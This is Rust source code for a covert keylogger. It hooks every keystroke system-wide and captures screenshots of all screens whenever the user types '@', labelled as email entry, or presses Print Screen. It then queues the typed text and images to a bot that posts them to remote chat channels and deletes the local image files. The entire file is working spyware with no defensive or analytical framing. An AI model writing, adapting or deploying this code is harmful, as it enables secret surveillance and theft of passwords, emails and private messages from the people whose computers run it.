use std::{path::Path, time::{SystemTime, Duration}, ffi::OsStr};
use chrono::{DateTime, Local};
use once_cell::sync::Lazy;
use rand::distributions::{Alphanumeric, DistString};
use screenshots::{self, Screen};
use serde_json::json;
use rdev::{listen, EventType, Key};
use tokio::sync::{Mutex, MutexGuard};
use crate::{BOT_TO_SEND, CHANNEL_IDS};
static TEXT: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(String::new()));
static EVENTS: std::sync::Mutex<Vec<rdev::Event>>= std::sync::Mutex::new(Vec::new());
pub struct KeyLogger;
impl KeyLogger {
    pub async fn main() {
        std::thread::spawn(|| {
            let _= listen(move |event| {
                EVENTS.lock().unwrap().push(event);
            });
        });
        loop {
            while EVENTS.lock().unwrap().len()> 0 {
                let event= EVENTS.lock().unwrap().remove(0);
                let mut text= TEXT.lock().await;
                let channel_ids= CHANNEL_IDS.lock().await;
                let mut process= true;
                if let Some(mut string)= event.name {
                    let index= string.encode_utf16().collect::<Vec<u16>>()[0];
                    if index> 0x1f && index!= 0x7f {
                        if &string== "@" {
                            take_screenshot(&mut text, "Typing E-Mail".into()).await;
                        }
                        let repl= ["*", "_", "~", ">", "#"];
                        string= string.replace('`', " `Slash` ");
                        for r in repl {
                            string= string.replace(r, &format!("`{r}`"));
                        }
                        *text+= &string;
                        for r in repl {
                            for m in repl {
                                *text= text.replace(&format!("{r}``{m}"), &format!("{r}{m}"));
                            }
                        }
                        process= false;
                    }
                }
                if process {
                    if let EventType::KeyPress(key)= event.event_type {
                        match key {
                            Key::PrintScreen => {
                                take_screenshot(&mut text, "Print Screen".into()).await;
                            }
                            Key::SemiColon => {}
                            Key::Return => {
                                if text.len()> 0 && text.get(text.len() - 1..).unwrap_or("")!= " " {
                                    *text+= " ";
                                }
                                *text+= "`Enter` ";
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": channel_ids.get(
                                        if text.contains("wwwww") || text.contains("aaaaa") || text.contains("sssss") || text.contains("ddddd") {
                                            if channel_ids.get("spam").unwrap().is_some() {
                                                "spam"
                                            }else{
                                                "main"
                                            }
                                        }else{
                                            "main"
                                        }).unwrap().unwrap_or(0),
                                    "content": *text
                                }));
                                text.clear();
                            }
                            _ => {
                                if text.len()> 0 && text.get(text.len() - 1..).unwrap_or("")!= " " {
                                    *text+= " ";
                                }
                                *text+= &format!("`{:?}` ", key);
                            }
                        }
                    }
                }
                if text.len()> 1950 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_ids.get(
                            if text.contains("wwwww") || text.contains("aaaaa") || text.contains("sssss") || text.contains("ddddd") {
                                if channel_ids.get("spam").unwrap().is_some() {
                                    "spam"
                                }else{
                                    "main"
                                }
                            }else{
                                "main"
                            }).unwrap().unwrap_or(0),
                        "content": *text
                    }));
                    text.clear();
                }
            }
            tokio::time::sleep(Duration::from_secs_f64(1. / 60.)).await;
        }
    }
}
async fn take_screenshot(text: &mut MutexGuard<'_, String>, ss_text: String) {
    let screens= Screen::all().unwrap();
    let mut files= Vec::new();
    for screen in screens {
        let image= screen.capture().unwrap();
        let buffer= image.buffer();
        let p= std::env::temp_dir().to_string_lossy().to_string() + &screen.display_info.id.to_string() + "-" + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".png";
        std::fs::write(&p, buffer).unwrap();
        files.push(p);
    }
    let channel_ids= CHANNEL_IDS.lock().await;
    BOT_TO_SEND.lock().await.push(json!({
        "channel": channel_ids.get(
            if text.contains("wwwww") || text.contains("aaaaa") || text.contains("sssss") || text.contains("ddddd") {
                if channel_ids.get("spam").unwrap().is_some() {
                    "spam"
                }else{
                    "main"
                }
            }else{
                "main"
            }).unwrap().unwrap_or(0),
        "content": **text,
        "files": files,
        "embed": true,
        "title": Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r").to_string() + " *`[" + &ss_text + "]`*",
        "color": 0x0084ff,
        "image": format!("attachment://{}", Path::new(files.last().unwrap()).file_name().unwrap_or(OsStr::new("")).to_string_lossy()),
        "delete_files": true,
        "react": ["📌"]
    }));
    text.clear();
}